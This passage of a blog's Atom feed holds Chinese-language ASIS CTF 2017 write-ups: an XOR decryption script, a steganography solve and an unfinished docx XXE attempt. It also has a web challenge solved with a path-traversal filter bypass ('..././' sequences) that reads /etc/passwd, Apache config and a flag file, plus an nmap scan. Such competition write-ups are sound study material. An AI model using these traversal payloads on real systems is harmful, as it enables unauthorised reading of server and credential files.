y)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(x) &gt; len(y):</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x[:len(y)], y)])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x, y[:len(x)])])</div><div class="line"></div><div class="line">flag, key = FLAG.encode(<span class="string">'hex'</span>), KEY.encode(<span class="string">'hex'</span>)</div><div class="line">enc = xor_str(key * (len(flag) // len(key) + <span class="number">1</span>), flag).encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">ef = open(<span class="string">'flag.enc'</span>, <span class="string">'w'</span>)</div><div class="line">ef.write(enc.decode(<span class="string">'hex'</span>))</div><div class="line">ef.close()</div></pre></td></tr></table></figure></p>
<p>流程如下；</p>
<ol>
<li>将FLAG,KEY进行hex编码得到flag，key</li>
<li>经过xor_str()处理，将flag，key的每一位对应进行异或操作，返回最后的结果后进行一次hex编码，得到enc</li>
<li>将enc进行hex解码后写入到文件flag.enc中</li>
</ol>
<p>由于只是进行简单的异或操作，所以解密系统可以归纳如下：</p>
<ol>
<li>从flag.enc中读取，并进行hex编码，得到enc</li>
<li>把KEY进行hex编码，得到key</li>
<li>将key和enc进行xor_str()处理，并进行一次hex编码，得到flag</li>
<li>将flag进行hex解码，得到FLAG</li>
</ol>
<p>据此写出解密脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_str</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(x) &gt; len(y):</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x[:len(y)], y)])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x, y[:len(x)])])</div><div class="line"></div><div class="line">ef = open(<span class="string">'flag.enc'</span>, <span class="string">'rb'</span>)</div><div class="line">flag = ef.read()</div><div class="line"></div><div class="line">KEY = <span class="string">'musZTXmxV58UdwiKt8Tp'</span></div><div class="line">key = KEY.encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">dec = xor_str(key * (len(flag) // len(key) + <span class="number">1</span>), flag).encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">df = open(<span class="string">"decflag"</span>,<span class="string">'wb'</span>)</div><div class="line">df.write(dec.decode(<span class="string">'hex'</span>))</div><div class="line">df.close()</div></pre></td></tr></table></figure></p>
<p>得到的decflag里的一长串字符用hex编辑器处理一下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/1.png?raw=true" alt=""></p>
<p>得到flag：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/2.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ASISCTF2017-Simple Crypto-writeup&lt;br&gt;简单异或加密&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Crypto" scheme="http://chybeta.github.io/categories/writeup-Crypto/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="crypto" scheme="http://chybeta.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>ASISCTF2017-ASIS secret letter-writeup</title>
    <link href="http://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/"/>
    <id>http://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/</id>
    <published>2017-09-11T13:47:37.000Z</published>
    <updated>2017-09-12T10:30:18.611Z</updated>
    
    <content type="html"><![CDATA[<p>ASISCTF2017-ASIS secret letter-writeup<br>binwalk  Stéganô<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The face is the index of the mind, its ASIS secret letter!</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了压缩包，解压后得到两张图片。用binwalk看一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/asis_letter# binwalk *</div><div class="line"></div><div class="line">Scan Time:     2017-09-06 07:51:11</div><div class="line">Target File:   /root/Desktop/asis_letter/3baa358f6d671e86f17bc4439cc4062e</div><div class="line">MD5 Checksum:  3baa358f6d671e86f17bc4439cc4062e</div><div class="line">Signatures:    344</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">56            0x38            Zlib compressed data, default compression</div><div class="line"></div><div class="line"></div><div class="line">Scan Time:     2017-09-06 07:51:11</div><div class="line">Target File:   /root/Desktop/asis_letter/e07d17ed7d8104590ff3e17bdf052057</div><div class="line">MD5 Checksum:  e07d17ed7d8104590ff3e17bdf052057</div><div class="line">Signatures:    344</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             PNG image, 4351 x 2812, 8-bit/color RGB, non-interlaced</div><div class="line">41            0x29            Zlib compressed data, default compression</div></pre></td></tr></table></figure></p>
<p>用命令<code>binwalk -e *</code>解压出文件，在图片3baa358f6d671e86f17bc4439cc4062e解压得到的文件夹中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/asis_letter# cd _3baa358f6d671e86f17bc4439cc4062e.extracted/</div><div class="line">root@chybeta:~/Desktop/asis_letter/_3baa358f6d671e86f17bc4439cc4062e.extracted# ls</div><div class="line">38  38.zlib</div><div class="line">root@chybeta:~/Desktop/asis_letter/_3baa358f6d671e86f17bc4439cc4062e.extracted# cat 38</div><div class="line">OEorU2pDQWdabkp2YlNCQlUwbFRJSGRwZEdnZ2JHOTJaU3dnY0d4bFlYTmxJR1pwYm1RZ2MyVmpjbVYwSUcxbGMzTmhaMlVnWVc1a0lISmxjR3g1SUhOdmIyNHNJSEJ2ZDJWeVpXUWdZbmtnOEorUmlTQWdVM1REcVdkaGJzTzBJUENma1lnPQ==r</div></pre></td></tr></table></figure></p>
<p>将上面的base64串进行解密，得到：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">"OEorU2pDQWdabkp2YlNCQlUwbFRJSGRwZEdnZ2JHOTJaU3dnY0d4bFlYTmxJR1pwYm1RZ2MyVmpjbVYwSUcxbGMzTmhaMlVnWVc1a0lISmxjR3g1SUhOdmIyNHNJSEJ2ZDJWeVpXUWdZbmtnOEorUmlTQWdVM1REcVdkaGJzTzBJUENma1lnPQ==r"</span>)</div><div class="line"><span class="string">'8J+SjCAgZnJvbSBBU0lTIHdpdGggbG92ZSwgcGxlYXNlIGZpbmQgc2VjcmV0IG1lc3NhZ2UgYW5kIHJlcGx5IHNvb24sIHBvd2VyZWQgYnkg8J+RiSAgU3TDqWdhbsO0IPCfkYg='</span></div></pre></td></tr></table></figure></p>
<p>继续进行base64解密：</p>
<p>得到提示：<code>Stéganô</code> 。</p>
<p>在github上搜索，发现了一个项目：<a href="https://github.com/cedricbonhomme/Stegano" target="_blank" rel="external">cedricbonhomme/Stegano
</a></p>
<p>经过尝试，最后的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">stegano-lsb-set reveal -i e07d17ed7d8104590ff3e17bdf052057 -g triangular_numbers</div></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125;</div></pre></td></tr></table></figure></p>
<p>或者用python<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> stegano <span class="keyword">import</span> lsbset</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> stegano.lsbset <span class="keyword">import</span> generators</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>message = lsbset.reveal(<span class="string">"./e07d17ed7d8104590ff3e17bdf052057"</span>, generators.triangular_numbers())</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>message</div><div class="line"><span class="string">'ASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125;'</span></div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ASISCTF2017-ASIS secret letter-writeup&lt;br&gt;binwalk  Stéganô&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://chybeta.github.io/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="steg" scheme="http://chybeta.github.io/tags/steg/"/>
    
  </entry>
  
  <entry>
    <title>ASISCTF2017-GSA File Server-writeup</title>
    <link href="http://chybeta.github.io/2017/09/11/ASISCTF2017-GSA-File-Server-writeup/"/>
    <id>http://chybeta.github.io/2017/09/11/ASISCTF2017-GSA-File-Server-writeup/</id>
    <published>2017-09-11T08:39:24.000Z</published>
    <updated>2017-09-12T10:29:37.711Z</updated>
    
    <content type="html"><![CDATA[<p>ASISCTF2017-GSA File Server-writeup<br>docx-xxe漏洞<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">GSA&apos;s file server, go find the hole, drill it and grab the flag :)</div><div class="line">Note that Scope is 128.199.40.185:*</div><div class="line">Alert: No remote brute force and automated scanning are needed.</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看源代码，发现有 <a href="http://128.199.40.185/js/functions.js" target="_blank" rel="external">functionds.js</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    $(<span class="string">"#files"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        $.get(<span class="string">'/showFiles'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">            <span class="keyword">var</span> myArray = $.parseJSON(data);</div><div class="line"></div><div class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;myArray.length; i++) &#123;</div><div class="line">                <span class="built_in">console</span>.log(myArray[i])</div><div class="line">                $(<span class="string">"#results"</span>).append(<span class="string">'&lt;a href="files/'</span>+myArray[i]+<span class="string">'"&gt;&lt;img src="/images/file-icon.png" width="50" height="50" alt="" border="0"/&gt;&lt;/a&gt;'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;)</div><div class="line">    &#125;)</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>当在页面上的图片（它id为files）点击时，它会向 <a href="http://128.199.40.185/showFiles" target="_blank" rel="external">http://128.199.40.185/showFiles</a> 发送GET请求，并将返回的结果加到页面中。点击后即可下载文件，下载链接为 <a href="http://128.199.40.185/files/demo.docx" target="_blank" rel="external">http://128.199.40.185/files/demo.docx</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/14.png?raw=true" alt=""></p>
<p>点击页面的图片(id为files)，用burp抓包，查看返回头部；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/12.png?raw=true" alt=""></p>
<p>在Response包中，多了<code>Directory: .</code>，消息主体为<code>[&quot;demo.docx&quot;]</code>，看上去是指当前目录（即 ./ ）下有一个文件名为demo.docx。尝试指定Directory字段为<code>..</code>，这样表示上一级目录（即 ../ ）：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/13.png?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/15.png?raw=true" alt=""></p>
<p>不过翻来翻去，好像莫啥用。题目给的网址是 128.199.40.185:* ，注意端口并没有指定，用nmap扫扫：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -T4 -A -v 128.199.40.185</div></pre></td></tr></table></figure></p>
<p>扫描结果大致如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Nmap scan report for 128.199.40.185</div><div class="line">Host is up (0.20s latency).</div><div class="line">Not shown: 995 closed ports</div><div class="line">PORT     STATE SERVICE     VERSION</div><div class="line">22/tcp   open  ssh         (protocol 2.0)</div><div class="line">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</div><div class="line">80/tcp   open  http        Apache httpd 2.4.25 ((Ubuntu))</div><div class="line">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</div><div class="line">|_http-title: GSA File Server</div><div class="line">139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WEB-01)</div><div class="line">445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WEB-01)</div><div class="line">8081/tcp open  http        Apache httpd 2.4.25 ((Ubuntu))</div><div class="line">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</div><div class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</div></pre></td></tr></table></figure></p>
<p>除了80端口外，8081端口也运行着web服务，访问：<a href="http://128.199.40.185:8081/" target="_blank" rel="external">http://128.199.40.185:8081/</a> 没啥信息。<br>结合前面利用burp探测得到的目录结构，我们访问：<a href="http://128.199.40.185:8081/panelManager-0.1/" target="_blank" rel="external">http://128.199.40.185:8081/panelManager-0.1/</a> 。有一个上传功能：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/16.png?raw=true" alt=""></p>
<p>经过初步尝试，结合前面file文件里的demo.docx文件，可以联想到XXE漏洞，关于word的xxe，可以看看<a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf" target="_blank" rel="external">exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality</a>。接下来创建包含有xxe-payload的word文档。</p>
<p>(下面还未成功，能请求外部的xxe，但似乎最后没办法发送请求出来。。。我再试试)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ASISCTF2017-GSA File Server-writeup&lt;br&gt;docx-xxe漏洞&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ASISCTF2017-Mathilda-writeup</title>
    <link href="http://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/"/>
    <id>http://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/</id>
    <published>2017-09-11T07:02:47.000Z</published>
    <updated>2017-09-11T08:25:35.178Z</updated>
    
    <content type="html"><![CDATA[<p>ASISCTF2017-Mathilda-writeup<br>文件包含 apache配置userdir<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Description:</div><div class="line">Mathilda learned many skills from Leon, now she want to use them!</div><div class="line">http://178.62.48.181/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/1.png?raw=true" alt=""></p>
<p>打开后是如上，查看源代码，发现：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/2.png?raw=true" alt=""></p>
<p>访问：<a href="http://178.62.48.181/~rooney/" target="_blank" rel="external">http://178.62.48.181/~rooney/</a> 。底下有个file选项，链接为: <a href="http://178.62.48.181/~rooney/?path=rooney" target="_blank" rel="external">http://178.62.48.181/~rooney/?path=rooney</a></p>
<p>猜测path参数存在文件包含漏洞。经过尝试，可以发现后端会把path参数里的<code>../</code>替换为空。如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/3.png?raw=true" alt=""></p>
<p>尝试读取index.php，如果直接访问 <a href="http://178.62.48.181/~rooney/index.php?path=index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php?path=index.php</a> ，会发现直接返回<code>Security failed!</code>，鉴于会过滤<code>../</code>，可以用<code>p../hp</code>来绕过。经过一番尝试，最后访问：<a href="http://178.62.48.181/~rooney/index.php?path=..././index.ph../p" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php?path=..././index.ph../p</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/7.png?raw=true" alt=""><br>不过似乎没啥信息。</p>
<p>接着尝试读取 <code>/etc/passwd</code>，比如路径为 <code>../../../../etc/passwd</code>，则根据过滤，传入的参数应为：<code>..././..././..././..././etc/passwd</code>。<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/?path=..././..././..././..././etc/passwd</div></pre></td></tr></table></figure></p>
<p>或者访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/index.php?path=..././..././..././..././etc/passwd</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/4.png?raw=true" alt=""></p>
<p>最底下有一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">th1sizveryl0ngus3rn4me:x:1001:1001:,,,:/home/th1sizveryl0ngus3rn4me:/bin/bash</div></pre></td></tr></table></figure></p>
<p>说明存在一个用户：th1sizveryl0ngus3rn4me</p>
<p>接下来需要知道一些apache的知识。apache中有一个功能 <a href="https://httpd.apache.org/docs/2.4/howto/public_html.html" target="_blank" rel="external">Per-user web directories</a>。在多用户的操作系统上，如果apache配置了UserDir，则每个用户可以在自己的目录下建立一个web服务器，对应的url即为:<a href="http://example.com/~username/" target="_blank" rel="external">http://example.com/~username/</a> ，就本例而言 <a href="http://178.62.48.181/~rooney/" target="_blank" rel="external">http://178.62.48.181/~rooney/</a> 即表示rooney用户自己的目录的web服务器。</p>
<p>所以尝试访问: <a href="http://178.62.48.181/~th1sizveryl0ngus3rn4me" target="_blank" rel="external">http://178.62.48.181/~th1sizveryl0ngus3rn4me</a> ，结果直接返回个 Invalid Device 。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/5.png?raw=true" alt=""></p>
<p>继续看看关于apache:UserDir的知识。UserDir指令可以指定被网络读取的用户网站目录，有如下几种不同的形式。</p>
<ol>
<li>路径前没有反斜杠，则被当作用户目录下的文件夹，比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir public_html</div></pre></td></tr></table></figure>
</li>
</ol>
<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /home/rooney/public_html/index.php</p>
<ol>
<li>路径前有反斜杠，则利用路径和文件名构造。比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir /var/html</div></pre></td></tr></table></figure>
</li>
</ol>
<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /var/html/rooney/index.php</p>
<ol>
<li>如果路径中存在星号<code>*</code>，则用用户名去替代，比如配置为:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir /var/www/*/docs</div></pre></td></tr></table></figure>
</li>
</ol>
<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /var/www/rooney/docs/index.php</p>
<ol>
<li>设置多重路径，比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir public_html /var/html</div></pre></td></tr></table></figure>
</li>
</ol>
<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会先去查找 /home/rooney/public_html/index.php ，如果找不到，那就去查找 /var/html/rooney/index.php</p>
<p>以上的这些配置指令取自<a href="https://httpd.apache.org/docs/2.4/howto/public_html.html" target="_blank" rel="external">Per-user web directories</a>的例子。这些指令需要在userdir.conf中进行配置。我们尝试读取一下服务器端的userdir.conf，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././etc/apache2/mods-enabled/userdir.conf</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/8.png?raw=true" alt=""></p>
<p>所以可以知道，如果我们访问：<br><code>http://178.62.48.181/~th1sizveryl0ngus3rn4me/index.php</code> 实际上会被apache服务器解释为 /home/th1sizveryl0ngus3rn4me/public_html/index.php 。由于直接访问不允许，我们可以利用 rooney 的文件包含来读取，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.ph../p</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/9.png?raw=true" alt=""></p>
<p>所以看起来，我们用了非预期的解法hhh。可以看出同目录下就有flag.php，我们可以直接读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/flag.ph../p</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/10.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ASIS&#123;I_l0V3_Us3rD1r_Mpdul3!!&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ASISCTF2017-Mathilda-writeup&lt;br&gt;文件包含 apache配置userdir&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
</feed>
